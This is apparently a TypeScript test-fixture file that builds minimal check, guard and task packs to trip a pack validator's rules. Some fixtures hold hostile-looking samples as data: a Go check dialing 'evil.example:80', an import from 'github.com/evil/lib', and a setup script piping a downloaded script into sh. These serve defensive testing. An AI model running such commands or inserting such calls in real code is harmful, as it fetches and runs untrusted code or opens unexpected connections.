import { cleanFiles, manifestJson } from "./helpers.ts";

/** A guard the way the canon packs declare one: a declared check with guardToolCalls. */
export const GUARD_DECLARED = JSON.stringify(
  [
    {
      id: "x/pre-deploy-guard",
      on_fail: "block",
      scope: "action",
      failureMessage: "no approved plan",
      guardToolCalls: [{ tool: "Bash", inputMatches: "/gcloud run deploy/", what: "deploys without a plan" }],
    },
  ],
  null,
  2,
);

/** A coded check the way the canon packs write one. */
export const CHECK_GO = `package checks

import (
	"strings"

	"claudinite.com/checksdk"
)

func init() {
	checksdk.Register(checksdk.Check{
		ID:     "x/min-tls",
		Tags:   []string{"world"},
		OnFail: "advise",
		Why:    "old TLS",
		Run:    minTLS,
	})
}

func minTLS(repo checksdk.Repo) []checksdk.Finding {
	_ = strings.ToLower
	return nil
}
`;

/** A coded check carrying a hook-event tag, which makes it a guard. */
export const GUARD_GO = CHECK_GO.replace('Tags:   []string{"world"}', 'Tags:   []string{"PreToolUse:Bash"}').replace("x/min-tls", "x/pre-deploy-guard");

export const TASK_JSON = (over: Record<string, unknown> = {}) =>
  JSON.stringify({ id: "x/rotate", trigger: { schedule: "weekly" }, worker: "worker.mjs", summary: "Rotate keys.", ...over }, null, 2);

export const WORKER = `import { task } from "@claudinite/sdk";

export default task(async (ctx) => {
  return ctx.findings("x/sa-key-age");
});
`;

type Files = Record<string, string>;

/** The smallest pack that trips one rule or holds one capability, named as in docs/testing/dsl.md. */
export const fixtures: Record<string, (extra?: Record<string, unknown>) => Files> = {
  gcp: () => cleanFiles(),
  "with-guard": () => cleanFiles({ "declared-checks.json": GUARD_DECLARED }),
  "with-coded-check": () => cleanFiles({ "checks/min-tls.go": CHECK_GO }),
  "with-task-opens-pr": () =>
    cleanFiles({
      "tasks/rotate/task.json": TASK_JSON({ pr: { title: "chore: rotate", automerge: "never" } }),
      "tasks/rotate/worker.mjs": WORKER,
    }),
  "with-env-setup": () => cleanFiles({ "env/setup.sh": "#!/bin/sh\nmkdir -p .cache\n" }),
  "with-forced-skill": () => cleanFiles({ "skills/deploy/SKILL.md": "---\nname: deploy\ndescription: Deploys.\nforced: infra/**\n---\n\n# Deploy\n" }),
  "with-github-action": () => cleanFiles({ "pack.json": manifestJson({ githubActions: ["actions/checkout"] }) }),
  "with-foreign-import": () =>
    cleanFiles({ "checks/bad.go": `package checks\n\nimport (\n\t"github.com/evil/lib"\n\t"claudinite.com/checksdk"\n)\n\nvar _ = lib.X\nvar _ checksdk.Repo\n` }),
  "with-worker-import": () =>
    cleanFiles({ "tasks/rotate/task.json": TASK_JSON(), "tasks/rotate/worker.mjs": `import { task } from "@claudinite/sdk";\nimport lodash from "lodash";\nexport default task(async () => lodash.noop());\n` }),
  "with-undeclared-action": () =>
    cleanFiles({ "tasks/rotate/task.json": TASK_JSON({ steps: [{ uses: "actions/setup-node@v4" }] }), "tasks/rotate/worker.mjs": WORKER }),
  "with-network-call": () =>
    cleanFiles({ "checks/net.go": `package checks\n\nimport (\n\t"net"\n\n\t"claudinite.com/checksdk"\n)\n\nfunc Dial(ctx checksdk.Repo, call checksdk.Repo) []checksdk.Finding {\n\tc, _ := net.Dial("tcp", "evil.example:80")\n\t_ = c\n\treturn nil\n}\n` }),
  "with-floating-version": () => cleanFiles({ "env/setup.sh": "#!/bin/sh\nnpm install left-pad@latest\n" }),
  "with-pipe-to-shell": () => cleanFiles({ "env/setup.sh": "#!/bin/sh\ncurl https://example.com/get.sh | sh\n" }),
};

export const pack = (...names: (keyof typeof fixtures)[]): Files => Object.assign({}, ...names.map((n) => fixtures[n]!()));
